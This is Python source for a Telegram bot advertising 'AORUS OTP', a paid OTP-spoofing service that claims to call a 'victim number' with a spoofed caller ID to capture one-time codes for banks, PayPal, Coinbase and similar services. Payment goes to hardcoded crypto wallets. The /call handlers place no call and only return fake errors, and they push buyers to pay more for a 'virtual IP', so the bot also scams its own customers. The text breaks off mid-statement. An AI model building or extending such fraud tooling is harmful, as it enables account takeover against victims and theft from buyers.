import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from keepalive import keep_alive
from aiogram.types import FSInputFile
from aiogram import Bot
from db import create_users_table, get_user_info, add_user,set_user_value, get_user_count, user_exists
from time import sleep
from datetime import datetime, timedelta
from dotenv import load_dotenv
from aiogram.types import ChatMember
from aiogram.enums.chat_member_status import ChatMemberStatus
import re
import os

keep_alive()
load_dotenv()

bot = Bot(token=os.environ.get('token'))
dp = Dispatcher()

services = [
    'marcus', 'zelle', 'email', 'cibc', 'cashapp', 'applepay', 'paypal',
    'bankofamerica', 'amazon', 'gmail', 'wellsfargo', 'venmo', 'citizens',
    'bank', 'capitalone', 'coinbase', 'afterpay', 'visa', 'mastercard',
    'facebook', 'whatsapp', 'instagram'
]

with open("1hour.txt", "r") as file:
    lines = file.readlines()
key1hour = [line.strip() for line in lines]

with open("1day.txt", "r") as file:
    lines = file.readlines()
key1day = [line.strip() for line in lines]

with open("3days.txt", "r") as file:
    lines = file.readlines()
key3days = [line.strip() for line in lines]

with open("7days.txt", "r") as file:
    lines = file.readlines()
key1week = [line.strip() for line in lines]

with open("month.txt", "r") as file:
    lines = file.readlines()
key1month = [line.strip() for line in lines]

with open("3months.txt", "r") as file:
    lines = file.readlines()
key3months = [line.strip() for line in lines]




admin_ID,new_users_ID,redeemed_keys_ID,redeem_ip_ID,banned_ID,main_channel_ID,vouches_ID = 7937156097,-1002182436976,-1002618555054,-1002616169248,-1002659687622,-1002666251781,-1002662428684 #CHANNEL IDs

main_channel_link,vouches_link,admin_link = 'https://t.me/+bVgkMu_cq-sxNDI0','https://t.me/+iuVoCM_yAuY1M2Fk','https://t.me/xccn5426' #CHANNEL LINKS 

btc,usdt,sol,ltc = 'bc1q98y83fh28y6ysklu9qmla7enuegldmgdcdawvk','TRRVAuPEGJ4EgE33u1pV6gNUXxM1R5v1aY','8Ra9HKVrKNakEeQfqDzrVn1sFoQoFmbR51UHMRweT9hY','LRJ8n55djedy4jyKP3Kkqi6iEy3BYC1FLt'

#ESCAPE TEXT
def escape_markdown(text):
    escape_chars = r"_*[]()~`>#+-=|{}.!\\,"
    return re.sub(f"([{re.escape(escape_chars)}])", r"\\\1", text)


#SET USER EXPIRATION DATE
def set_expired_date(user_id,plan):
    now = datetime.now()
    if get_user_info(user_id,'date')=='N/A':
        if plan == '1hour':
            expire_date = now+timedelta(hours=1)
        elif plan == '1day':
            expire_date = now+timedelta(days=1)
        elif plan == '3days':
            expire_date = now+timedelta(days=3)
        elif plan == '1week':
            expire_date = now+timedelta(days=7)
        elif plan == '1month':
            expire_date = now+timedelta(days=30)
        elif plan == '3months':
            expire_date = now+timedelta(days=90)
    elif datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f") < now:
        if plan == '1hour':
            expire_date = now+timedelta(hours=1)
        elif plan == '1day':
            expire_date = now+timedelta(days=1)
        elif plan == '3days':
            expire_date = now+timedelta(days=3)
        elif plan == '1week':
            expire_date = now+timedelta(days=7)
        elif plan == '1month':
            expire_date = now+timedelta(days=30)
        elif plan == '3months':
            expire_date = now+timedelta(days=90)
    elif datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f") > now:
        old_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
        if plan == '1hour':
            expire_date = old_date+timedelta(hours=1)
        elif plan == '1day':
            expire_date = old_date+timedelta(days=1)
        elif plan == '3days':
            expire_date = old_date+timedelta(days=3)
        elif plan == '1week':
            expire_date = old_date+timedelta(days=7)
        elif plan == '1month':
            expire_date = old_date+timedelta(days=30)
        elif plan == '3months':
            expire_date = old_date+timedelta(days=90)
    set_user_value(user_id,'date',str(expire_date))


#is user in channels
async def is_user_in_channel(bot: Bot, user_id):
        member: ChatMember = await bot.get_chat_member(chat_id=vouches_ID, user_id=user_id)
        member1: ChatMember = await bot.get_chat_member(chat_id=main_channel_ID, user_id=user_id)
        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.CREATOR, ChatMemberStatus.ADMINISTRATOR] and member1.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.CREATOR, ChatMemberStatus.ADMINISTRATOR]

    

#START
@dp.message(Command("start")) #DONE
async def start_message(message):
    user_id = message.from_user.id
    if not(get_user_info(user_id,"banned")):
        name = message.from_user.first_name
        if message.from_user.username:
            username = "@"+message.from_user.username
        else:
            username='None'
        if not(user_exists(user_id)):
            add_user(message.from_user)
            await bot.send_message(chat_id=new_users_ID,text='🆕 *New user*: ['+str(get_user_count())+']\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`\n*User ID*\: `'+str(user_id)+'`',parse_mode='MarkdownV2')
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🌐 Community", callback_data="community")
            ],
            [
                InlineKeyboardButton(text="🆘 Support", url=admin_link),
                InlineKeyboardButton(text="👤 Profile", callback_data="profile"),
            ],
            [
                InlineKeyboardButton(text="⚙️ Commands", callback_data="Commands"),
                InlineKeyboardButton(text="📃 Features", callback_data="Features")
            ],
            [
                InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
            ]
        ]
        )
        image = FSInputFile("img.jpg")
        await message.answer_photo(image, caption="""*AORUS OTP*
                                
Hello *"""+escape_markdown(name)+"""*\,                         
Step into the future of OTP spoofing with *AORUS OTP*\.

🔥 *Why AORUS OTP?*
Harness the power of cutting\-edge AI\, ultra\-fast global voice routing\, and seamless real\-time control — all designed to deliver *unrivaled OTP capture performance*\.

🎯 *Core Features*
🔸 Blazing\-Fast Execution
🔸 Military\-Grade Spoofing Stealth
🔸 Fully Automated Workflow Tools
🔸 Global Coverage with 100% Uptime""", reply_markup=keyboard,parse_mode='MarkdownV2')


#BAN USER
@dp.message(Command("ban")) # DONE
async def unban_user(message: Message):
    user_id = message.from_user.id
    if user_id == admin_ID:
        args = message.text.split(maxsplit=1)
        set_user_value(int(args[1]),'banned',True)
        await bot.send_message(chat_id=banned_ID,text=get_user_info(int(args[1]),'first_name')+' banned successfully!')
        for msg_id in range(message.message_id - 50, message.message_id):
            try:
                await bot.delete_message(chat_id=int(args[1]), message_id=msg_id)
            except:
                pass
        try:
            await bot.ban_chat_member(chat_id=main_channel_ID, user_id=int(args[1]))
            await bot.ban_chat_member(chat_id=vouches_ID, user_id=int(args[1]))
            await bot.send_message(chat_id=banned_ID,text="User "+get_user_info(int(args[1]),'first_name')+" has been banned from the channels.")
        except Exception as e:
            await bot.send_message(chat_id=banned_ID,text="Failed to ban user: "+str(e))
    else:
        await message.answer("🚫 Only admin can use this command.")


#UNBAN USER
@dp.message(Command("unban")) # DONE
async def unban_user(message: Message):
    user_id = message.from_user.id
    if user_id == admin_ID:
        args = message.text.split(maxsplit=1)
        set_user_value(int(args[1]),'banned',False)
        await bot.send_message(chat_id=banned_ID,text=get_user_info(int(args[1]),'first_name')+' unbanned successfully!')
        try:
            await bot.unban_chat_member(chat_id=main_channel_ID, user_id=int(args[1]))
            await bot.unban_chat_member(chat_id=vouches_ID, user_id=int(args[1]))
            await bot.send_message(chat_id=banned_ID,text="User "+get_user_info(int(args[1]))+" has been unbanned from the channels.")
        except Exception as e:
            await bot.send_message(chat_id=banned_ID,text="Failed to unban user: "+str(e))
    else:
        await message.answer("🚫 Only admin can use this command.")


#CONVERT WALLET
@dp.message(Command("switch")) # DONE
async def switch_wallets(message: Message):
    global btc,usdt,sol,ltc
    user_id = message.from_user.id
    if user_id == admin_ID:
        if btc != 'bc1q98y83fh28y6ysklu9qmla7enuegldmgdcdawvk':
            btc,usdt,sol,ltc = 'bc1q98y83fh28y6ysklu9qmla7enuegldmgdcdawvk','TRRVAuPEGJ4EgE33u1pV6gNUXxM1R5v1aY','8Ra9HKVrKNakEeQfqDzrVn1sFoQoFmbR51UHMRweT9hY','LRJ8n55djedy4jyKP3Kkqi6iEy3BYC1FLt'
            await message.answer("From mahmod to kacem wallets switched successfully.")
        else:
            btc,usdt,sol,ltc = '12cb6coYbjnWZz2iwmJQu7mozsNNiNVhDZ','TEVNwArAAHUQt85QzPLmrvr3mbYo1NCVpr','826JXyvv4VG9ktLbNWxJ7sde8SGSJRBqsAe8VQr5LShm','LfUJW3kWVh1JW3WcXLvskw15s3ywm55qkL'
            await message.answer("From kacem wallets to mahmod wallets switched successfully.")
    else:
        await message.answer("🚫 Only admin can use this command.")


#CONVERT MAIN CHANNEL LINK
@dp.message(Command("channel")) # DONE
async def switch_channel_link(message: Message):
    global main_channel_ID,main_channel_link
    user_id = message.from_user.id
    if user_id == admin_ID:
        args = message.text.split(maxsplit=2)
        main_channel_link = 'https://t.me/'+args[1]
        main_channel_ID = int(args[2])
        await bot.send_message(chat_id=admin_ID ,text='Channel id and link replaced successfully')
    else:
        await message.answer("🚫 Only admin can use this command.")


#CONVERT vouches LINK
@dp.message(Command("vouches")) # DONE
async def switch_vouches_link(message: Message):
    global vouches_ID,vouches_link
    user_id = message.from_user.id
    if user_id == admin_ID:
        args = message.text.split(maxsplit=2)
        vouches_link = 'https://t.me/'+args[1]
        vouches_ID = int(args[2])
        await bot.send_message(chat_id=admin_ID ,text='Vouches id and link replaced successfully')
    else:
        await message.answer("🚫 Only admin can use this command.")


#CHECK FOR PHONELIST
@dp.message(Command("Phonelist")) #DONE
async def phonelist(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        if await is_user_in_channel(bot,user_id):
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                    InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
                    ],
                    [
                        InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
                    ]
                ]
                )
            await message.answer("""*Spoofing Numbers list*

    `4165550137`
    `2125550143`
    `7800667788`
    `6045550198`
    `3105550191`
    `7480112233`""",parse_mode='MarkdownV2',reply_markup=keyboard)
        else:
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
                    ],
                    [
                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
                    ]
                ]
                )
            await message.delete()
            await message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)


#CHECK FOR SERVICES
@dp.message(Command("services")) #DONE
async def check_services(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        if await is_user_in_channel(bot,user_id):
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                    InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
                    ],
                    [
                        InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
                    ]
                ]
                )
            await message.answer("""*Services list*

    `marcus` \| `zelle` \| `email`
    `cibc` \| `cashapp` \| `applepay`
    `paypal` \| `bankofamerica` \| `amazon`
    `gmail` \| `wellsfargo` \| `venmo`
    `citizens` \| `bank` \| `capitalone`
    `coinbase` \| `afterpay` \| `visa` 
    `mastercard` \| `facebook` \| `whatsapp`
    `instagram`""",parse_mode='MarkdownV2',reply_markup=keyboard)
        else:
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
                    ],
                    [
                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
                    ]
                ]
                )
            await message.delete()
            await message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)

#PURACHSING COMMAND
@dp.message(Command("purchase")) #DONE
async def purchase(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🆘 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="💲 USDT", callback_data="usdt"),
                InlineKeyboardButton(text="₿ BTC", callback_data="btc")
            ],
            [
                InlineKeyboardButton(text="𝑳 LTC", callback_data="ltc"),
                InlineKeyboardButton(text="◎ SOL", callback_data="sol")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
            ]
        ]
        )
        await message.answer("""💸 Choose your subscription plan and send it to one of the following wallets bellow\:
                                     
  • 1 Hour Plan   ➜ *10$ \(trial mode\)*                                                                   
  • 1 Day plan    ➜ *25$*
  • 3 Days plan   ➜ *40$*
  • 1 Week plan   ➜ *80$*
  • 1 Month plan  ➜ *220$*
  • 3 Months plan ➜ *480$*
  • Premium plan ➜ *45$ \(2 days \+ bot sources\)*""",parse_mode='MarkdownV2',reply_markup=keyboard)


#PROFILE
@dp.message(Command("plan")) #DONE
async def check_profile(message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
            ]
        ]
        )
        if get_user_info(user_id,'date') != 'N/A' and not (get_user_info(user_id,'trial')):
            now = datetime.now()
            expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
            if now > expire_date:
                await message.answer("🚫 Your subscription has expired.",reply_markup=keyboard)
            else:
                keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
                ]
                ]
                )
                expire_date = str(expire_date)
                await message.answer("🕜 Your subscription expire in "+expire_date[:16],reply_markup=keyboard)
        elif get_user_info(user_id,'date') == 'N/A':
            await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard)
        else:
            await message.answer("🚫 Your trial mode plan has expired.",reply_markup=keyboard)


#REDEEM KEY
@dp.message(Command("redeem"))
async def redeem(message: Message): #DONE
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        args = message.text.split(maxsplit=1)
        if message.from_user.username:
            username = "@"+message.from_user.username
        else:
            username='None'
        if len(args) < 2:
            await message.answer("❌ Please enter your activation key. /redeem [activation key]")
        elif args[1] == '192.168.56.101':
            sleep(1)
            await message.answer("⌛ Please wait.")
            sleep(3)
            await message.answer("🌅 Virtual IP adresse redeemed successfully!")
            await bot.send_message(chat_id=redeem_ip_ID,text='🆕 *user redeemed IP*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
            set_user_value(int(args[1]),'banned',True) 
        else:
            keyboard1 = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🆘 Support", url=admin_link)
            ]
        ]
        )
            if args[1] in key1hour:
                sleep(1)
                await message.answer("⌛ Please wait.")
                sleep(3)
                set_expired_date(user_id,'1hour')
                await message.answer("🌅 Trial Key for 1 Hour redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")                    
                await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Hour key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
            elif args[1] in key1day:
                if get_user_info(user_id,'IP'):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    set_expired_date(user_id,'1day')
                    await message.answer("🌅 Key for 1 Day redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Day key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            elif args[1] in key3days:
                if get_user_info(user_id,'IP'):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    set_expired_date(user_id,'3days')
                    await message.answer("🌅 Key for 3 Days redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 3 Days key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            elif args[1] in key1week:
                if get_user_info(user_id,'IP'):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    set_expired_date(user_id,'1week')
                    await message.answer("🌅 Key for 1 Week redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Week key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            elif args[1] in key1month:
                if get_user_info(user_id,'IP'):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    set_expired_date(user_id,'1month')
                    await message.answer("🌅 Key for 1 Month redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Month key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            elif args[1] in key3months:
                if get_user_info(user_id,'IP'):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    set_expired_date(user_id,'3months')
                    await message.answer("🌅 Key for 3 Months redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 3 Months key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            elif args[1] == 'AORUS-0VYCJ-P6HZG-LLIWW-8Q5X4':
                if not (get_user_info(user_id,'IP')):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    await message.answer("🌅 Premium key redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed premium key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                    set_user_value(int(args[1]),'banned',True)
                    await bot.send_message(chat_id=banned_ID,text=get_user_info(int(args[1]),'first_name')+' unbanned successfully!')
                    for msg_id in range(message.message_id - 50, message.message_id):
                        try:
                            await bot.delete_message(chat_id=user_id, message_id=msg_id)
                        except:
                            pass
                    try:
                        await bot.ban_chat_member(chat_id=main_channel_ID, user_id=int(args[1]))
                        await bot.ban_chat_member(chat_id=vouches_ID, user_id=int(args[1]))
                        await bot.send_message(chat_id=banned_ID,text="User "+get_user_info(int(args[1]),'first_name')+" has been banned from the channels.")
                    except Exception as e:
                        await bot.send_message(chat_id=banned_ID,text="Failed to ban user: "+str(e))      
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            else:
                sleep(1)
                await message.answer("⌛ Please wait.")
                sleep(5)
                await message.answer("❌ Unavailable or expired key.")


#call
@dp.message(Command("call")) #DONE
async def send_local_video(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        if await is_user_in_channel(bot,user_id):
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🆘 Support", url=admin_link)]])
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")],[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]])
            if get_user_info(user_id,'date')!='N/A':
                    now = datetime.now()
                    expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
                    if now < expire_date:
                        args = message.text.split(maxsplit=4)
                        if len(args)<4:
                            await message.answer("You have to enter 3 arguments, /call [victim_number] [spoof_number] [service_name] [digitlenght]")
                        else:
                            victim=args[1]
                            number=args[2]
                            if victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15 and args[4].isdecimal() and args[3] in services:
                                sleep(1)
                                await message.answer("""🔥 CALL STARTED 
    📲 VICTIM NUMBER : """+victim+"""
    📞 CALLER ID : """+number+"""
    🏦 SERVICE NAME : """+args[3]+"""
    ⚙️ OTP DIGITS: """+args[4])
                                sleep(8)
                                if not (get_user_info(user_id,'trial')): 
                                    await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
                                else:
                                    await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
                            elif not(victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15):
                                await message.answer("You have to type a valid phone number.")
                            elif args[3] not in services:
                                await message.answer("You have to choose a valid service.\nType /services to check our available services.")
                            elif not(args[4].isdecimal()):
                                await message.answer("The digits must be between 4 and 8")
                    else:
                        await message.answer("Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
            elif get_user_info(user_id,'date') =='N/A':
                await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard1)
        else:
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
                    ],
                    [
                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
                    ]
                ]
                )
            await message.delete()
            await message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)

#PREBUILT COMMANDS
@dp.message(Command("paypal","venmo","applepay","coinbase","microsoft","amazon","quadpay")) #DONE
async def prebuilt_commands(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        if await is_user_in_channel(bot,user_id):
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🆘 Support", url=admin_link)]])
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")],[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]])
            if get_user_info(user_id,'date')!='N/A':
                    now = datetime.now()
                    expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
                    if now < expire_date:
                        args = message.text.split(maxsplit=2)
                        if len(args)<3:
                            await message.answer("You have to enter 2 arguments, "+args[0]+" [victim_number] [digitlenght]")
                        else:
                            victim=args[1]
                            if victim.isdecimal() and 6<=len(victim)<=15 and args[2].isdecimal():
                                sleep(1)
                                await message.answer("""🔥 CALL STARTED 
    📲 VICTIM NUMBER : """+victim+"""
    📞 CALLER ID : 7800667788
    ⚙️ OTP DIGITS: """+args[2])
                                sleep(8)
                                if not (get_user_info(user_id,'trial')): 
                                    await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
                                else:
                                    await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
                            elif not(victim.isdecimal() and 6<=len(victim)<=15):
                                await message.answer("You have to type a valid phone number.")
                            elif not(args[4].isdecimal()):
                                await message.answer("The digits must be between 4 and 8")
                    else:
                        await message.answer("Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
            elif get_user_info(user_id,'date') =='N/A':
                await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard1)
        else:
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
                    ],
                    [
                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
                    ]
                ]
                )
            await message.delete()
            await message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)

#RESTART
@dp.callback_query(F.data.in_(["back"]))#DONE
async def restart_message(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not(get_user_info(user_id,"banned")):
        name = callback.from_user.first_name
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🌐 Community", callback_data="community")
            ],
            [
                InlineKeyboardButton(text="🆘 Support", url=admin_link),
                InlineKeyboardButton(text="👤 Profile", callback_data="profile"),
            ],
            [
                InlineKeyboardButton(text="⚙️ Commands", callback_data="Commands"),
                InlineKeyboardButton(text="📃 Features", callback_data="Features")
            ],
            [
                InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
            ]
        ]
        )
        await callback.message.delete()
        image = FSInputFile("img.jpg")
        await callback.message.answer_photo(image, caption="""*AORUS OTP*
                                
Hello *"""+escape_markdown(name)+"""*\,                         
Step into the future of OTP spoofing with *AORUS OTP*\.

🔥 *Why AORUS OTP?*
Harness the power of cutting\-edge AI\, ultra\-fast global voice routing\, and seamless real\-time control — all designed to deliver *unrivaled OTP capture performance*\.

🎯 *Core Features*
🔸 Blazing\-Fast Execution
🔸 Military\-Grade Spoofing Stealth
🔸 Fully Automated Workflow Tools
🔸 Global Coverage with 100% Uptime""", reply_markup=keyboard,parse_mode='MarkdownV2')


#CHECK IF USER IN CHANNELS
@dp.callback_query(F.data.in_(["check_subchannel"]))#DONE
async def check_subchannel(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not(get_user_info(user_id,"banned")):
        if await is_user_in_channel(bot,user_id):
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
                ]
            ]
            )
            await callback.message.delete()
            await callback.message.answer("✔ You are a subscriber.\nYou can use the bot now.", reply_markup=keyboard)
        else:
            await callback.message.delete()
            await callback.message.answer("❌ You didn't subscribe yet.", reply_markup=keyboard)
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
                    ],
                    [
                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
                    ]
                ]
                )
            await callback.message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)


#COMMANDS
@dp.callback_query(F.data.in_(["Commands"]))#DONE
async def commands(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        if await is_user_in_channel(bot,user_id):
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
                ],
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
                ]
            ]
            )
            await callback.message.delete()
            await callback.message.answer("""*AORUS OTP* \- Commands
    ❓ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 
        • /redeem    ➜ Redeem a key
        • /Phonelist ➜ Check List of Latest Spoof Numbers
        • /call      ➜ Capture OTP for any service
        • /plan      ➜ Check account status
        • /purchase  ➜ Purchase access to the bot
        • /services  ➜ All services available
                                                                                    
    ⚙️ Pre\-built modules
        • /paypal    ➜ Paypal Code
        • /venmo     ➜ Venmo Code
        • /applepay  ➜ ApplePay Code
        • /coinbase  ➜ Coinbase Code
        • /microsoft ➜ Microsoft Code
        • /amazon    ➜ Amazon Code
        • /quadpay   ➜ Quadpay Code""",reply_markup=keyboard,parse_mode='MarkdownV2')
        else:
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
